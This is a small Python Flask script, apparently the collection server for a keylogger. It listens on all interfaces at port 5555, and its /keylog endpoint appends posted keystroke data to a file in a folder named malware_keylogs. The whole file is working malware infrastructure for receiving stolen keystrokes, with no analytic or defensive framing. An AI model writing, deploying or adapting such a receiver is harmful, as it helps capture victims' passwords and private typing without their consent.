from flask import Flask, request
from pathlib import Path

app = Flask(__name__)
KEYLOG_DIR = Path("malware_keylogs")

@app.route("/keylog", methods=["POST"])
def receive_keylog():
    data = request.data.decode()
    
    # Création du dossier s'il n'existe pas
    KEYLOG_DIR.mkdir(parents=True, exist_ok=True)

    with open(KEYLOG_DIR / "keylog.txt", "a") as f:
        f.write(data)
    print("[+] Keylog reçu.")
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5555)
